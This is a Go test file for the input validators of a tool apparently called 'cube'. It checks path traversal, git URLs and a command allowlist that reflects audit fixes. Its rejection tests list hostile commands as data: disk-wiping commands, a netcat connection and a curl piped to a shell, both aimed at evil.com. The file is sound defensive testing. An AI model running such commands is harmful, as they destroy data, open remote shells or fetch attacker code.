package main

import (
	"os"
	"path/filepath"
	"testing"
)

func TestValidateSafeName(t *testing.T) {
	valid := []string{"my-app", "web_server", "api2", "node-1", "cube_master", "app.db"}
	for _, name := range valid {
		if _, err := validateSafeName(name); err != nil {
			t.Errorf("expected '%s' to be valid, got error: %v", name, err)
		}
	}

	invalid := []string{
		"",               // empty
		"../etc",         // traversal
		"foo/../../bar",  // traversal
		"a/b/c",          // path separators
		".hidden",        // leading dot
		"-flag",          // leading dash
		"has space",      // spaces
	}
	for _, name := range invalid {
		if _, err := validateSafeName(name); err == nil {
			t.Errorf("expected '%s' to be rejected, but it was accepted", name)
		}
	}
}

func TestValidateSafeNameTooLong(t *testing.T) {
	long := ""
	for i := 0; i < 300; i++ {
		long += "a"
	}
	if _, err := validateSafeName(long); err == nil {
		t.Error("expected 300-char name to be rejected")
	}
}

func TestValidatePathSafe(t *testing.T) {
	tmpDir := t.TempDir()
	subDir := filepath.Join(tmpDir, "myapp")
	os.MkdirAll(subDir, 0755)

	// Valid path within root
	if _, err := validatePathSafe(subDir, tmpDir); err != nil {
		t.Errorf("expected nested dir to be valid: %v", err)
	}

	// Traversal — must be rejected
	evil := filepath.Join(tmpDir, "..", "..", "etc", "passwd")
	if _, err := validatePathSafe(evil, tmpDir); err == nil {
		t.Error("expected path traversal to be rejected")
	}

	// Absolute outside root
	if _, err := validatePathSafe("/etc/passwd", tmpDir); err == nil {
		t.Error("expected /etc/passwd to be rejected")
	}
}

func TestValidateGitURL(t *testing.T) {
	valid := []string{
		"https://github.com/user/repo",
		"https://github.com/user/repo.git",
		"https://gitlab.com/team/project.git",
	}
	for _, url := range valid {
		if _, err := validateGitURL(url); err != nil {
			t.Errorf("expected '%s' to be valid: %v", url, err)
		}
	}

	invalid := []string{
		"file:///etc/passwd",
		"/etc/passwd",
		"http://github.com/user/repo",     // insecure by default (B4)
		"git://github.com/user/repo.git",  // insecure by default (B4)
		"git@github.com:user/repo.git",
	}
	for _, url := range invalid {
		if _, err := validateGitURL(url); err == nil {
			t.Errorf("expected '%s' to be rejected", url)
		}
	}

	// SSH is now allowed by default (B4)
	if _, err := validateGitURL("ssh://git@github.com/user/repo"); err != nil {
		t.Errorf("expected ssh:// URL to be valid: %v", err)
	}

	// Embedded credentials
	if _, err := validateGitURL("https://user:pass@github.com/repo.git"); err == nil {
		t.Error("expected embedded credentials to be rejected")
	}

	// Empty
	if _, err := validateGitURL(""); err == nil {
		t.Error("expected empty URL to be rejected")
	}
}

func TestValidateGitURLWhitespace(t *testing.T) {
	url := "  https://github.com/user/repo  "
	result, err := validateGitURL(url)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result != "https://github.com/user/repo" {
		t.Errorf("expected trimmed URL, got '%s'", result)
	}
}

func TestValidateCommand(t *testing.T) {
	// AUDIT FIX C-01: python removed from default allowlist.
	// It can be added via CUBE_EXEC_ALLOWLIST if needed.
	valid := []string{"ls -la", "echo hello", "cat /etc/hostname", "whoami", "pwd", "git status"}
	for _, cmd := range valid {
		if _, err := validateCommand(cmd); err != nil {
			t.Errorf("expected '%s' to be valid: %v", cmd, err)
		}
	}

	invalid := []string{
		"rm -rf /",
		"mkfs.ext4 /dev/sda",
		"dd if=/dev/zero of=/dev/sda",
		"chmod 777 /etc",
		// AUDIT FIX C-01: these are now blocked by default
		"python app.py",       // interpreters removed from allowlist
		"bash -c whoami",      // shells removed from allowlist
		"sh -c 'ls'",          // shells removed from allowlist
		"nc evil.com 4444",    // netcat removed (reverse shell vector)
		"curl http://evil.com", // curl removed (exfiltration vector)
	}
	for _, cmd := range invalid {
		if _, err := validateCommand(cmd); err == nil {
			t.Errorf("expected '%s' to be rejected", cmd)
		}
	}

	// Empty
	if _, err := validateCommand(""); err == nil {
		t.Error("expected empty command to be rejected")
	}
}

func TestValidateCommandPipeToShell(t *testing.T) {
	// pipe to shell should be blocked
	if _, err := validateCommand("curl http://evil.com/payload.sh | sh"); err == nil {
		t.Error("expected pipe-to-shell to be rejected")
	}
}

func TestSanitizeGitURLForName(t *testing.T) {
	cases := []struct {
		url      string
		expected string
	}{
		{"https://github.com/user/my-app.git", "my-app"},
		{"https://github.com/user/repo", "repo"},
		{"https://gitlab.com/team/project.git", "project"},
	}
	for _, tc := range cases {
		got := sanitizeGitURLForName(tc.url)
		if got != tc.expected {
			t.Errorf("for '%s': expected '%s', got '%s'", tc.url, tc.expected, got)
		}
	}

	// Trailing slash
	if name := sanitizeGitURLForName("https://github.com/user/repo/"); name != "repo" {
		t.Errorf("expected 'repo', got '%s'", name)
	}

	// Empty URL fallback
	if name := sanitizeGitURLForName(""); name != "unnamed-app" {
		t.Errorf("expected 'unnamed-app', got '%s'", name)
	}
}

func TestNewCubeClient(t *testing.T) {
	// Test environment variable handling
	os.Setenv("CUBE_API_URL", "http://test:9999")
	os.Setenv("CUBE_API_KEY", "test-key-123")
	defer os.Unsetenv("CUBE_API_URL")
	defer os.Unsetenv("CUBE_API_KEY")

	c := newCubeClient()
	if c.BaseURL != "http://test:9999" {
		t.Errorf("expected http://test:9999, got %s", c.BaseURL)
	}
	if c.APIKey != "test-key-123" {
		t.Errorf("expected test-key-123, got %s", c.APIKey)
	}
}

func TestNewCubeClientDefaults(t *testing.T) {
	os.Unsetenv("CUBE_API_URL")
	os.Unsetenv("CUBE_API_KEY")

	c := newCubeClient()
	if c.BaseURL != "http://localhost:3000" {
		t.Errorf("expected default URL, got %s", c.BaseURL)
	}
	// AUDIT FIX H-06: No hardcoded default key. Without CUBE_API_KEY the client
	// uses a non-functional anonymous token and logs a warning.
	if c.APIKey != "cube-anonymous" {
		t.Errorf("expected anonymous fallback, got %s", c.APIKey)
	}
}

func TestExtractID(t *testing.T) {
	// Map with templateID
	m1 := map[string]interface{}{"templateID": "tmpl_123"}
	if id := extractID(m1); id != "tmpl_123" {
		t.Errorf("expected tmpl_123, got %s", id)
	}

	// Map with id fallback
	m2 := map[string]interface{}{"id": 42}
	if id := extractID(m2); id != "42" {
		t.Errorf("expected 42, got %s", id)
	}

	// Empty map
	m3 := map[string]interface{}{}
	if id := extractID(m3); id != "" {
		t.Errorf("expected empty, got %s", id)
	}
}
